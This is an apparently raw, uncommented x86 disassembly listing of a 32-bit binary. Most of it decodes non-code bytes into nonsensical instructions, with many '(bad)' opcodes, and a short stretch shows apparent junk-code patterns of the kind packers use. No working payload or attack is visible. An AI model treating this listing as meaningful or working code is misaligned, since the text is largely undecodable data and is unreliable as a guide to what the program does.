  402200:	mov    esp,0xaa25ec9e
  402205:	stos   DWORD PTR es:[edi],eax
  402206:	add    bl,BYTE PTR [eax]
  402208:	sbb    BYTE PTR [esi+0x69181812],bl
  40220e:	nop
  40220f:	cmp    al,0x27
  402211:	xchg   edi,eax
  402212:	mov    ebx,0x763243b2
  402217:	jge    0x40220f
  402219:	lods   eax,DWORD PTR ds:[esi]
  40221a:	jb     0x4021f8
  40221c:	xchg   esi,eax
  40221d:	add    DWORD PTR [edx+0x16],0xfffffff0
  402221:	(bad)  
  402222:	aad    0x76
  402224:	es (bad) 
  402226:	iret   
  402227:	dec    edx
  402228:	loope  0x40225a
  40222a:	in     eax,dx
  40222b:	mov    ds:0x2da71cd1,al
  402230:	aaa    
  402231:	sbb    al,0x4b
  402233:	xor    BYTE PTR ds:0x3291ed54,dl
  402239:	bound  edx,QWORD PTR [ebx+0x10bf8879]
  40223f:	aas    
  402240:	sahf   
  402241:	dec    edi
  402242:	adc    ecx,DWORD PTR [ebx]
  402244:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402245:	(bad)  
  402246:	mov    ebx,0xf0d41c96
  40224b:	pop    ss
  40224c:	xchg   edi,eax
  40224d:	dec    eax
  40224e:	sbb    esp,DWORD PTR [edx-0x4a9080e3]
  402254:	mov    edx,0x89691937
  402259:	scas   eax,DWORD PTR es:[edi]
  40225a:	sbb    edi,esp
  40225c:	jg     0x40229f
  40225e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40225f:	push   ebp
  402260:	les    esp,FWORD PTR [ebp-0x6f]
  402263:	mov    ebp,0x95385ed
  402268:	xchg   edx,eax
  402269:	sbb    edi,ebx
  40226b:	push   cs
  40226c:	rcr    BYTE PTR [esi],1
  40226e:	mov    edx,DWORD PTR [edi+0x30]
  402271:	pushf  
  402272:	enter  0xd806,0x41
  402276:	imul   edi,DWORD PTR ds:[edx],0xec16f898
  40227d:	pop    es
  40227e:	push   ecx
  40227f:	fst    QWORD PTR [esi]
  402281:	sub    bl,ah
  402283:	jg     0x402227
  402285:	inc    esp
  402286:	adc    esi,DWORD PTR [edx-0x7fe2e2f7]
  40228c:	(bad)  
  40228d:	jae    0x4022a9
  40228f:	jge    0x40228c
  402291:	out    dx,eax
  402292:	sbb    DWORD PTR [ebx],ebx
  402294:	inc    eax
  402295:	cmp    al,0x7a
  402297:	stos   BYTE PTR es:[edi],al
  402298:	daa    
  402299:	cwde   
  40229a:	pop    es
  40229b:	cli    
  40229c:	scas   al,BYTE PTR es:[edi]
  40229d:	cs dec esi
  40229f:	retf   0x2e9
  4022a2:	lock aam 0xc3
  4022a5:	cmc    
  4022a6:	out    0xa8,eax
  4022a8:	(bad)  
  4022a9:	les    eax,FWORD PTR [ebp-0x1fb231bd]
  4022af:	fistp  WORD PTR [esi]
  4022b1:	pop    es
  4022b2:	and    dl,bl
  4022b4:	call   0xa230:0x889bfb55
  4022bb:	lahf   
  4022bc:	ins    BYTE PTR es:[edi],dx
  4022bd:	push   ecx
  4022be:	les    edi,FWORD PTR [ebp-0x41]
  4022c1:	sbb    eax,0xe92a6902
  4022c6:	mov    fs,WORD PTR ds:0xae3a88fb
  4022cc:	adc    ebx,DWORD PTR [ecx-0x55]
  4022cf:	jmp    0x40230d
  4022d1:	imul   ebx,DWORD PTR [edi+0x4632c110],0xda5b6ca1
  4022db:	fdiv   DWORD PTR [eax]
  4022dd:	adc    DWORD PTR [edi+eiz*1+0x6a8a1793],ebp
  4022e4:	mov    al,0x98
  4022e6:	sbb    BYTE PTR [ebx+ecx*2],cl
  4022e9:	inc    ebx
  4022ea:	fs (bad) 
  4022ec:	leave  
  4022ed:	jg     0x4022b6
  4022ef:	arpl   WORD PTR [edx-0x4d],cx
  4022f2:	dec    edx
  4022f3:	leave  
  4022f4:	icebp  
  4022f5:	fisubr WORD PTR [esi-0x4898849]
  4022fb:	in     eax,0x5e
  4022fd:	clc    
  4022fe:	inc    esp
  4022ff:	fnstenv [edx]
  402301:	push   es
  402302:	ja     0x402290
  402304:	cmp    al,0xdb
  402306:	out    dx,al
  402307:	fmul   DWORD PTR [edx+0x3a]
  40230a:	inc    ebp
  40230b:	cmc    
  40230c:	fs neg eax
  40230f:	inc    ecx
  402310:	out    dx,eax
  402311:	fwait
  402312:	push   0xa2e9d3c1
  402317:	scas   eax,DWORD PTR es:[edi]
  402318:	pop    edi
  402319:	call   0x7cd274d5
  40231e:	sbb    al,0x4b
  402320:	ins    BYTE PTR es:[edi],dx
  402321:	mov    eax,ds:0xdfe9f4a3
  402326:	jle    0x4022b1
  402328:	mov    dh,0xa1
  40232a:	xor    DWORD PTR [edi+0x4dd8ec3a],eax
  402330:	nop
  402331:	add    bl,BYTE PTR [ecx-0x18]
  402334:	adc    eax,0x590cd755
  402339:	hlt    
  40233a:	add    al,0xe
  40233c:	bound  eax,QWORD PTR [edi+0x7ccef07b]
  402342:	push   cs
  402343:	xor    ebp,DWORD PTR ds:0x6d735838
  402349:	inc    ebx
  40234a:	out    dx,eax
  40234b:	sub    al,0xf7
  40234d:	(bad)  [eax+0x49]
  402350:	pop    ss
  402351:	repz mov WORD PTR [ebx],fs
  402354:	mov    ecx,0x3b9158ba
  402359:	in     al,0x49
  40235b:	xchg   ebx,eax
  40235c:	dec    ebp
  40235d:	lods   eax,DWORD PTR ds:[esi]
  40235e:	xor    eax,0x34d8ecf1
  402363:	sub    bh,ah
  402365:	jne    0x4023a3
  402367:	xchg   edx,eax
  402368:	cmp    al,0x4f
  40236a:	mov    ebp,0xcc708368
  40236f:	cld    
  402370:	sbb    al,0x6c
  402372:	(bad)  
  402373:	pop    ecx
  402374:	ins    BYTE PTR es:[edi],dx
  402375:	pop    ss
  402376:	cdq    
  402377:	xor    ebx,DWORD PTR [edi]
  402379:	lahf   
  40237a:	out    0xbb,eax
  40237c:	inc    esi
  40237d:	scas   eax,DWORD PTR es:[edi]
  40237e:	push   edx
  40237f:	jg     0x4023fe
  402381:	push   edi
  402382:	arpl   WORD PTR [edx+edx*1-0x547ccad8],sp
  402389:	ror    esi,0xc8
  40238c:	xlat   BYTE PTR ds:[ebx]
  40238d:	jbe    0x402336
  40238f:	or     eax,0x32f2e7e3
  402394:	push   esi
  402395:	fadd   QWORD PTR [ebx+0x129afb54]
  40239b:	or     eax,0x113f811a
  4023a0:	fwait
  4023a1:	test   BYTE PTR [ecx+0x3cbf34a1],bh
  4023a7:	dec    eax
  4023a8:	pop    eax
  4023a9:	scas   al,BYTE PTR es:[edi]
  4023aa:	inc    ax
  4023ac:	pop    ds
  4023ad:	ror    BYTE PTR [edi],cl
  4023af:	fild   WORD PTR [esi]
  4023b1:	js     0x40239d
  4023b3:	out    dx,eax
  4023b4:	sbb    BYTE PTR ds:[edi-0x798f8624],bh
  4023bb:	push   ecx
  4023bc:	cdq    
  4023bd:	pusha  
  4023be:	jo     0x4023df
  4023c0:	xor    BYTE PTR ds:0xf01d8f78,ah
  4023c6:	in     eax,0x99
  4023c8:	nop
  4023c9:	xor    ebx,DWORD PTR [esi+eiz*4-0x22f9e020]
  4023d0:	outs   dx,BYTE PTR ds:[esi]
  4023d1:	push   eax
  4023d2:	sub    esi,DWORD PTR [ecx-0x6b]
  4023d5:	loope  0x4023b9
  4023d7:	ja     0x4023f5
  4023d9:	(bad)  
  4023da:	(bad)  
  4023db:	jne    0x40241d
  4023dd:	aas    
  4023de:	push   ecx
  4023df:	push   esp
  4023e0:	js     0x402387
  4023e2:	inc    eax
  4023e3:	mov    edi,0xd4932c1a
  4023e8:	(bad)  
  4023e9:	test   DWORD PTR [esp+esi*1],0x6f0ee4d1
  4023f0:	sbb    ebx,DWORD PTR [esi]
  4023f2:	rcl    BYTE PTR [esi],1
  4023f4:	xchg   esp,eax
  4023f5:	retf   
  4023f6:	sub    al,0x44
  4023f8:	scas   eax,DWORD PTR es:[edi]
  4023f9:	xchg   esi,eax
  4023fa:	adc    BYTE PTR [edi-0x1d53bce6],al
  402400:	aaa    
  402401:	jae    0x4023a7
  402403:	pop    ecx
  402404:	ret    0xf094
  402407:	stc    
  402408:	lea    esi,[esi+edx*2-0xbb1e7ad]
  40240f:	jno    0x40248a
  402411:	outs   dx,DWORD PTR ds:[esi]
  402412:	xlat   BYTE PTR ds:[ebx]
  402413:	xor    al,0x42
  402415:	push   ecx
  402416:	loop   0x4023ea
  402418:	mov    ds:0xd97f90fe,al
  40241d:	and    eax,0x2a68b13d
  402422:	mov    ds,WORD PTR [eax+0x636e7a5f]
  402428:	out    0xaa,al
  40242a:	mov    dh,0x76
  40242c:	cdq    
  40242d:	sbb    DWORD PTR [ebp-0x17],0xffffffa8
  402431:	ds jl  0x40249c
  402434:	pop    esi
  402435:	and    esi,eax
  402437:	scas   eax,DWORD PTR es:[edi]
  402438:	test   ah,ah
  40243a:	(bad)  
  40243b:	sbb    ebx,DWORD PTR [esp+edi*8+0x62]
  40243f:	mul    edi
  402441:	inc    ebp
  402442:	ss int3 
  402444:	cwde   
  402445:	fldenv [edi+eiz*2]
  402448:	lds    edx,FWORD PTR [edx+eax*8]
  40244b:	sub    DWORD PTR [ebx+0x5d152dfe],0x3a4bb453
  402455:	xchg   eax,edx
  402457:	aas    
  402458:	adc    DWORD PTR [ebx+edx*1+0x7a893fd8],edi
  40245f:	xor    DWORD PTR [eax+0x73],ebp
  402462:	sahf   
  402463:	dec    ebp
  402464:	fmul   st,st(2)
  402466:	ins    DWORD PTR es:[edi],dx
  402467:	call   0xf7a6956a
  40246c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40246d:	lea    esp,[ecx]
  40246f:	cli    
  402470:	clc    
  402471:	ds pop eax
  402473:	(bad)  
  402474:	sbb    esi,DWORD PTR [edi-0x5e]
  402477:	xchg   edi,eax
  402478:	cli    
  402479:	es pop eax
  40247b:	sti    
  40247c:	ins    BYTE PTR es:[edi],dx
  40247d:	jl     0x402443
  40247f:	sbb    dh,dl
  402481:	or     bh,0x62
  402484:	cmp    al,0x8c
  402486:	lea    ecx,[eax+0x65]
  402489:	sub    dh,BYTE PTR ds:0x90fd3342
  40248f:	mov    dl,0x91
  402491:	clc    
  402492:	enter  0x1946,0x46
  402496:	push   esi
  402497:	ds adc eax,0xa6beebcd
  40249d:	repnz pop edx
  40249f:	adc    bl,BYTE PTR [eax+0x3]
  4024a2:	cdq    
  4024a3:	xchg   edx,eax
  4024a4:	out    0xf0,al
  4024a6:	ret    0x9a1d
  4024a9:	pop    edi
  4024aa:	mov    dl,bh
  4024ac:	xor    dh,BYTE PTR [edi+ebp*4]
  4024af:	xchg   ecx,eax
  4024b0:	add    DWORD PTR [ecx+ebp*4],0x3e39a5c8
  4024b7:	xchg   BYTE PTR gs:[edx+0x76],bh
  4024bb:	enter  0xcc5e,0x96
  4024bf:	sub    al,dh
  4024c1:	inc    edx
  4024c2:	sbb    ch,BYTE PTR [ebx+0x30975f77]
  4024c8:	sub    edx,eax
  4024ca:	inc    esi
  4024cb:	fld    DWORD PTR [edi]
  4024cd:	fwait
  4024ce:	adc    DWORD PTR [esi-0x3a],esi
  4024d1:	mov    cs,WORD PTR [edx+0x1109f45b]
  4024d7:	cmp    BYTE PTR [esi-0x28dcf2cd],dh
  4024dd:	(bad)  
  4024df:	dec    edi
  4024e0:	in     al,0xdf
  4024e2:	(bad)  
  4024e3:	jb     0x402531
  4024e5:	pop    es
  4024e6:	stos   BYTE PTR es:[edi],al
  4024e7:	mov    DWORD PTR [ecx+0x11],ecx
  4024ea:	lock or DWORD PTR [eax],ebx
  4024ed:	in     al,0x8
  4024ef:	fadd   st(3),st
  4024f1:	and    DWORD PTR [esi+0x4c],esp
  4024f4:	lock sti 
  4024f6:	repz sub al,BYTE PTR [edx+0x28e68344]
  4024fd:	cdq    
  4024fe:	int3   
  4024ff:	pop    ss
  402500:	mov    WORD PTR [edi-0x3aa3908a],fs
  402506:	push   eax
  402507:	xor    al,0x19
  402509:	int3   
  40250a:	cmp    DWORD PTR [esi],0x38
  40250d:	sub    al,0x86
  40250f:	dec    ecx
  402510:	xchg   ebx,eax
  402511:	mov    ah,0xd7
  402513:	jae    0x402580
  402515:	mov    esi,0x3f75713d
  40251a:	fild   DWORD PTR [ebx-0x46]
  40251d:	push   esi
  40251e:	loopne 0x4024ed
  402520:	enter  0x386f,0xc0
  402524:	dec    edx
  402525:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402526:	int    0xca
  402528:	jbe    0x4025a1
  40252a:	daa    
  40252b:	pop    ebx
  40252c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40252d:	mov    ds:0x8e566ba8,al
  402532:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402533:	stos   BYTE PTR es:[edi],al
  402534:	in     al,dx
  402535:	cmp    al,0xed
  402537:	scas   al,BYTE PTR es:[edi]
  402538:	adc    DWORD PTR [edx+0x6e520d7f],eax
  40253e:	fxch   st(5)
  402540:	or     ah,BYTE PTR [eax+0x33]
  402543:	stos   DWORD PTR es:[edi],eax
  402544:	or     BYTE PTR [eax-0x325042b0],dl
  40254a:	test   eax,0x54a4b6de
  40254f:	cs cmp ah,al
  402552:	push   ebx
  402553:	push   0x5c896168
  402558:	ror    DWORD PTR [ebx],0x78
  40255b:	jmp    0x4025b4
  40255d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40255e:	sbb    DWORD PTR [edx-0x26],edi
  402561:	icebp  
  402562:	bound  esi,QWORD PTR [ebp+0x2e]
  402565:	mov    edx,0x77858ac1
  40256a:	mov    ecx,0x49e109d6
  40256f:	or     eax,0xea645447
  402574:	and    ebx,ecx
  402576:	daa    
  402577:	adc    ch,dl
  402579:	mov    bx,0xa764
  40257d:	stc    
  40257e:	js     0x402507
  402580:	adc    ebx,esp
  402582:	pop    esp
  402583:	cli    
  402584:	rol    DWORD PTR [edx-0x11],0xee
  402588:	arpl   ax,cx
  40258a:	stos   BYTE PTR es:[edi],al
  40258b:	push   edx
  40258c:	and    BYTE PTR [ecx],dl
  40258e:	cmp    cl,BYTE PTR [ecx-0x44]
  402591:	adc    BYTE PTR [ebp+0x54],cl
  402594:	xor    esp,0x971536c9
  40259a:	dec    edx
  40259b:	gs push esp
  40259d:	cmp    ebx,DWORD PTR [edx+0x5a]
  4025a0:	adc    al,0x46
  4025a2:	outs   dx,BYTE PTR ds:[esi]
  4025a3:	repz loopne 0x40255e
  4025a6:	shl    edx,0xc8
  4025a9:	add    al,0xe6
  4025ab:	adc    BYTE PTR [edi-0x3d3ecc4b],al
  4025b1:	test   DWORD PTR [edi],ebx
  4025b3:	add    DWORD PTR [edi+0x759ba062],0x6b05e23b
  4025bd:	shl    BYTE PTR [edx],cl
  4025bf:	lods   eax,DWORD PTR ds:[esi]
  4025c0:	mov    edx,0xb0cb64b0
  4025c5:	jno    0x402605
  4025c7:	jmp    0x402588
  4025c9:	test   al,0xd6
  4025cb:	adc    esi,DWORD PTR [ebp-0x22]
  4025ce:	mov    DWORD PTR [ebp-0x70],0x3b72
  4025d5:	movzx  eax,WORD PTR ds:0x4282df
  4025dc:	adc    DWORD PTR ds:0x42816b,eax
  4025e2:	mov    DWORD PTR [ebp-0x6c],0x3abc
  4025e9:	adc    DWORD PTR ds:0x428153,edi
  4025ef:	mov    DWORD PTR [ebp-0x68],0x1b45
  4025f6:	cmp    DWORD PTR ds:0x428147,0x0
  4025fd:	mov    DWORD PTR ds:0x4282f3,0x76b5
  402607:	mov    DWORD PTR ds:0x42814f,edx
  40260d:	mov    DWORD PTR ds:0x428267,0x4dfd
  402617:	jmp    0x40267d
  40261c:	mov    eax,ds:0x428253
  402621:	mov    eax,0x8f5
  402626:	cmp    DWORD PTR ds:0x428147,0x0
  40262d:	ja     0x402669
  402633:	push   DWORD PTR [ebp-0x14]
  402636:	push   0x1475
  40263b:	push   0x3d07
  402640:	push   0x42821f
  402645:	call   DWORD PTR ds:0x428d7c
  40264b:	sbb    DWORD PTR ds:0x42836b,0x36f
  402655:	adc    DWORD PTR ds:0x4282ef,0x428177
  40265f:	sub    DWORD PTR ds:0x42835f,0x4282fb
  402669:	and    DWORD PTR ds:0x42813f,0x42822b
  402673:	add    DWORD PTR ds:0x4282ff,0x6611
  40267d:	mov    DWORD PTR [ebp-0x64],0x767d
  402684:	sub    eax,DWORD PTR ds:0x428147
  40268a:	mov    DWORD PTR [ebp-0x60],0x1d973857
  402691:	mov    DWORD PTR [ebp-0x5c],0x0
  402698:	add    DWORD PTR ds:0x42813b,0x47ea
  4026a2:	mov    DWORD PTR [ebp-0x34],0x599d
  4026a9:	mov    DWORD PTR [ebp-0x2c],0x165d
  4026b0:	cmp    DWORD PTR ds:0x42826f,0x0
  4026b7:	mov    DWORD PTR ds:0x4282cf,edx
  4026bd:	mov    DWORD PTR ds:0x42822b,ecx
  4026c3:	mov    DWORD PTR ds:0x428153,edx
  4026c9:	mov    DWORD PTR ds:0x42824f,0x4bd1
  4026d3:	jmp    0x402743
  4026d8:	mov    eax,ds:0x42813b
  4026dd:	mov    DWORD PTR ds:0x42826f,edx
  4026e3:	cmp    DWORD PTR ds:0x42826f,0x0
  4026ea:	jg     0x402726
  4026f0:	push   DWORD PTR [ebp-0x28]
  4026f3:	push   0x2b2a
  4026f8:	push   0x1aa6
  4026fd:	push   0x3603
  402702:	call   DWORD PTR ds:0x428d80
  402708:	add    DWORD PTR ds:0x428277,0x4282d7
  402712:	sub    DWORD PTR ds:0x4282f3,0x6e4a
  40271c:	xor    DWORD PTR ds:0x42814b,0x16a6
  402726:	dec    DWORD PTR ds:0x428167
  40272c:	and    DWORD PTR ds:0x42824b,edx
  402732:	or     DWORD PTR ds:0x4282db,edx
  402738:	mov    eax,ds:0x42816f
  40273d:	and    DWORD PTR ds:0x428383,eax
  402743:	mov    DWORD PTR [ebp-0x1c],0xc51
  40274a:	movzx  eax,WORD PTR ds:0x428383
  402751:	sbb    DWORD PTR ds:0x42824f,eax
  402757:	mov    DWORD PTR [ebp-0x44],0x3f55
  40275e:	or     eax,0x5124
  402763:	mov    DWORD PTR [ebp-0x44],0x1
  40276a:	adc    DWORD PTR ds:0x42822f,0x6ac9
  402774:	mov    DWORD PTR [ebp-0x44],0x42e8
  40277b:	mov    eax,DWORD PTR [ebp-0x60]
  40277e:	dec    DWORD PTR ds:0x4282e3
  402784:	shl    ecx,0x1e
  402787:	not    ecx
  402789:	mov    ecx,DWORD PTR [ebp-0x5c]
  40278c:	jmp    0x402b6a
  402791:	out    dx,eax
  402792:	repz (bad) 
  402794:	cmp    bh,BYTE PTR [ebx+0x63226a1a]
  40279a:	pop    ds
  40279b:	and    eax,0xb1d731aa
  4027a0:	mov    al,0x30
  4027a2:	cld    
  4027a3:	sbb    BYTE PTR [eax],bl
  4027a5:	sahf   
  4027a6:	adc    bl,BYTE PTR [eax]
  4027a8:	sbb    BYTE PTR [ecx],ah
  4027aa:	jecxz  0x402818
  4027ac:	xor    DWORD PTR [ebx+0x66],ebp
  4027af:	in     eax,dx
  4027b0:	jg     0x402798
  4027b2:	cdq    
  4027b3:	popa   
  4027b4:	xchg   esp,eax
  4027b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027b6:	in     al,dx
  4027b7:	loop   0x40281b
  4027b9:	sbb    dh,bh
  4027bb:	xchg   ebp,eax
  4027bc:	sbb    ebx,DWORD PTR [edx+0x4]
  4027bf:	aam    0x7a
  4027c1:	inc    ebp
  4027c2:	mov    dh,al
  4027c4:	int3   
  4027c5:	leave  
  4027c6:	xchg   ecx,eax
  4027c7:	push   eax
  4027c8:	(bad)  
  4027ca:	jp     0x4027aa
  4027cc:	hlt    
  4027cd:	push   edx
  4027ce:	lock jge 0x402764
  4027d1:	jg     0x402838
  4027d3:	popa   
  4027d4:	and    al,0xd0
  4027d6:	jb     0x4027e1
  4027d8:	inc    ebp
  4027d9:	cmp    ebx,DWORD PTR [ecx+0xb]
  4027dc:	xor    eax,0x73ca2040
  4027e1:	ficomp DWORD PTR [edx]
  4027e3:	nop
  4027e4:	mov    edx,0xc1ae27c5
  4027e9:	add    DWORD PTR [ecx+0x6a09bb2d],esi
  4027ef:	loope  0x4027ba
  4027f1:	mov    gs,WORD PTR [esp+ecx*8-0x1fdafc2]
  4027f8:	adc    esi,eax
  4027fa:	xchg   ebp,eax
  4027fb:	pop    es
  4027fc:	jp     0x40282d
  4027fe:	mov    bh,0x6c
  402800:	mov    ebx,db7
  402803:	loopne 0x402831
  402805:	cmc    
  402806:	jp     0x402824
  402808:	xchg   edx,eax
  402809:	repnz dec ebx
  40280b:	dec    edi
  40280c:	sub    DWORD PTR [ebx+ecx*1+0x7],ebx
  402810:	mov    bl,0x4d
  402812:	mov    DWORD PTR [eax-0x152cb824],esi
  402818:	aam    0x7f
  40281a:	iret   
  40281b:	sahf   
  40281c:	jno    0x402863
  40281e:	test   eax,eax
  402820:	repnz popa 
  402822:	test   esi,ecx
  402824:	aaa    
  402825:	xor    eax,0x97c2fe85
  40282a:	cmp    eax,0xd08d2338
  40282f:	(bad)  
  402830:	push   cs
  402831:	push   ecx
  402832:	xor    edx,eax
  402834:	not    DWORD PTR [ebx+0x31]
  402837:	mov    dl,0x5
  402839:	or     esp,DWORD PTR [edx-0x2f15ab39]
  40283f:	sbb    DWORD PTR [esi-0x585b00cc],edx
  402845:	ja     0x40287f
  402847:	leave  
  402848:	sti    
  402849:	and    DWORD PTR [eax-0x13d0916],edx
  40284f:	fcmovnb st,st(1)
  402852:	xor    BYTE PTR [ecx],cl
  402854:	push   ds
  402855:	or     BYTE PTR [edx-0x38],ch
  402858:	(bad)  
  40285a:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40285c:	sbb    BYTE PTR [eax+0x12baa070],dl
  402862:	pop    ebx
  402863:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402864:	xor    ah,BYTE PTR [esi-0x5b]
  402867:	mov    esi,0xb778c152
  40286c:	aam    0xae
  40286e:	aaa    
  40286f:	pop    ebp
  402870:	xchg   edx,eax
  402871:	shl    DWORD PTR [ecx+0x5440adb6],cl
  402877:	aas    
  402878:	cld    
  402879:	mov    eax,0xd08efee7
  40287e:	mov    esi,0x79e0ff6
  402883:	loop   0x4028ca
  402885:	test   BYTE PTR [ebx],ah
  402887:	and    al,0x78
  402889:	std    
  40288a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40288b:	jmp    0xf11d:0x4b2bbe68
  402892:	call   0x62cb15e0
  402897:	fcom   DWORD PTR [esi+0x69480b67]
  40289d:	rcl    BYTE PTR [eax+0x33],cl
  4028a0:	fcom   st(6)
  4028a2:	mov    ds:0x1d95760d,al
  4028a7:	cld    
  4028a8:	lods   al,BYTE PTR ds:[esi]
  4028a9:	mov    ecx,DWORD PTR [esi]
  4028ab:	sbb    al,0x1b
  4028ad:	inc    ecx
  4028ae:	mov    fs,ebx
  4028b0:	cmp    al,0x71
  4028b2:	enter  0x78a9,0x74
  4028b6:	imul   ecx,DWORD PTR [edx+0x1a],0x63d964ea
  4028bd:	shl    DWORD PTR [edx+0x46],0x71
  4028c1:	ss call 0xab06ebbd
  4028c7:	rol    BYTE PTR [edi+0x6ae4f4e4],cl
  4028cd:	xchg   ebp,eax
  4028ce:	push   ds
  4028cf:	retf   
  4028d0:	mov    ch,0xc8
  4028d2:	pop    ecx
  4028d3:	(bad)  
  4028d4:	rol    dh,cl
  4028d6:	aaa    
  4028d7:	and    al,0x8b
  4028d9:	mov    al,ds:0x75b2b6f5
  4028de:	test   edx,ecx
  4028e0:	out    0x40,eax
  4028e2:	sbb    eax,0x819878b4
  4028e7:	scas   eax,DWORD PTR es:[edi]
  4028e8:	push   ss
  4028e9:	xchg   esi,eax
  4028ea:	js     0x4028ee
  4028ec:	cli    
  4028ed:	test   eax,0x64457ef9
  4028f2:	dec    eax
  4028f3:	mov    ss,edx
  4028f5:	ds dec esi
  4028f7:	mov    cl,dh
  4028f9:	hlt    
  4028fa:	xor    al,0x10
  4028fc:	jbe    0x40288f
  4028fe:	imul   esi,esi,0xffffff9c
  402901:	dec    esp
  402902:	or     edi,ebx
  402904:	push   esi
  402905:	xchg   esi,eax
  402906:	jo     0x4028e9
  402908:	fwait
  402909:	inc    edi
  40290a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40290b:	sub    eax,0x61b86126
  402910:	scas   al,BYTE PTR es:[edi]
  402911:	loopne 0x40292e
  402913:	jno    0x402905
  402915:	mov    ah,0xda
  402917:	aaa    
  402918:	add    eax,0xa4a9a864
  40291d:	div    bl
  40291f:	inc    ebp
  402920:	add    BYTE PTR [ebp-0x57dacc4],bh
  402926:	neg    BYTE PTR [edi]
  402928:	cmp    al,0x86
  40292a:	out    dx,al
  40292b:	push   ecx
  40292c:	push   ds
  40292d:	cmp    eax,0x1805fe99
  402932:	xor    edi,ecx
  402934:	dec    esp
  402935:	fdiv   st(0),st
  402937:	(bad)  
  402938:	jg     0x402977
  40293a:	(bad)  
  40293b:	mov    ebp,ds
  40293d:	sahf   
  40293e:	js     0x402988
  402940:	sub    BYTE PTR [edi+0x1da60e96],dh
  402946:	jmp    0x2e56:0x7503dc2a
  40294d:	bound  esp,QWORD PTR [eax]
  40294f:	ins    BYTE PTR es:[edi],dx
  402950:	in     al,0x2
  402952:	sub    eax,0x19f62bed
  402957:	cmp    DWORD PTR [ecx+0x4ced1371],edi
  40295d:	add    DWORD PTR ds:0xc9824544,edx
  402964:	cli    
  402965:	mov    al,BYTE PTR [esi-0x7f]
  402968:	pop    ebx
  402969:	or     al,0xaf
  40296b:	(bad)  
  40296c:	rcr    BYTE PTR [eax-0x4bfba77b],0x28
  402973:	pop    eax
  402974:	sbb    eax,ebx
  402976:	lock fld DWORD PTR ss:[eax]
  40297a:	nop
  40297b:	rcl    DWORD PTR [edx-0x6e8bd98c],0x88
  402982:	push   es
  402983:	xchg   BYTE PTR [edx+0x7b56b6f1],dl
  402989:	in     eax,dx
  40298a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40298b:	or     eax,0xfde0bf20
  402990:	js     0x4029b0
  402992:	adc    dl,ah
  402994:	lea    edx,fs:[edx]
  402997:	xor    al,0x9
  402999:	clc    
  40299a:	jecxz  0x402925
  40299c:	cmp    BYTE PTR [edi-0x65],bl
  40299f:	iret   
  4029a0:	mov    bl,0x2c
  4029a2:	ins    BYTE PTR es:[edi],dx
  4029a3:	dec    esi
  4029a4:	fsub   DWORD PTR [ebp-0x10]
  4029a7:	xor    al,0xa
  4029a9:	fsubr  QWORD PTR [ecx-0x2]
  4029ac:	cld    
  4029ad:	inc    ebp
  4029ae:	mov    ebx,0xca5ac9bf
  4029b3:	in     eax,0xc9
  4029b5:	mov    ah,0xe6
  4029b7:	pop    ebp
  4029b8:	push   edi
  4029b9:	mov    bh,0x9f
  4029bb:	push   esi
  4029bc:	gs xchg edx,eax
  4029be:	repz in eax,dx
  4029c0:	inc    ebp
  4029c1:	shl    ecx,cl
  4029c3:	repz scas al,BYTE PTR es:[edi]
  4029c5:	or     ebx,eax
  4029c7:	inc    edx
  4029c8:	popf   
  4029c9:	(bad)  
  4029ca:	(bad)  
  4029cc:	xor    esp,DWORD PTR [ebx-0x2c4756cc]
  4029d2:	(bad)  
  4029d3:	call   0x485938de
  4029d8:	cmp    eax,0xd30d53
  4029dd:	mov    ecx,0x671e6a0a
  4029e2:	mov    ?,WORD PTR ds:0xd3842316
  4029e8:	aas    
  4029e9:	push   ebp
  4029ea:	cmp    cl,BYTE PTR [esi]
  4029ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029ed:	jmp    0x4029bd
  4029ef:	ss xchg edi,eax
  4029f1:	xchg   ebp,eax
  4029f2:	add    BYTE PTR [edx+0x47d44b59],cl
  4029f8:	jo     0x402997
  4029fa:	repz xchg esp,eax
  4029fc:	mov    al,ds:0xfa90284b
  402a01:	adc    ebx,DWORD PTR [edi+edx*2+0x1d]
  402a05:	sub    ah,ch
  402a07:	push   edi
  402a08:	or     bl,ch
  402a0a:	in     eax,0x9b
  402a0c:	arpl   WORD PTR [esi],bx
  402a0e:	sahf   
  402a0f:	cld    
  402a10:	cli    
  402a11:	mov    bl,0xae
  402a13:	xor    al,0x27
  402a15:	adc    BYTE PTR [ecx],0x24
  402a18:	rcr    cl,1
  402a1a:	jbe    0x402a67
  402a1c:	test   al,0x46
  402a1e:	imul   ebx,esi,0xe0f7e2e8
  402a24:	stos   DWORD PTR es:[edi],eax
  402a25:	xchg   ebp,eax
  402a26:	pushf  
  402a27:	ja     0x4029d5
  402a29:	in     al,0xec
  402a2b:	jecxz  0x402a51
  402a2d:	ja     0x402a06
  402a2f:	mov    BYTE PTR [ebx+0x738ae636],0x8e
  402a36:	(bad)  [ebx+0x728c22d]
  402a3c:	lds    esp,FWORD PTR [esi-0x397231a2]
  402a42:	shl    DWORD PTR [ecx-0x4b],cl
  402a45:	outs   dx,BYTE PTR ds:[esi]
  402a46:	pop    esp
  402a47:	outs   dx,BYTE PTR ds:[esi]
  402a48:	fiadd  WORD PTR [ebx+edi*2]
  402a4b:	sbb    edx,DWORD PTR [esi]
  402a4d:	leave  
  402a4e:	bound  esp,QWORD PTR [eax]
  402a50:	mov    cl,0xe3
  402a52:	pusha  
  402a53:	call   0x8321:0xa9b0b86c
  402a5a:	loopne 0x402a57
  402a5c:	fisub  WORD PTR [edi+0x35cf411d]
  402a62:	add    bh,dh
  402a64:	mov    ebp,0x2d38055e
  402a69:	inc    ebx
  402a6a:	or     BYTE PTR [edx],al
  402a6c:	test   BYTE PTR [eax+0x7b],ah
  402a6f:	lds    edi,FWORD PTR [edx]
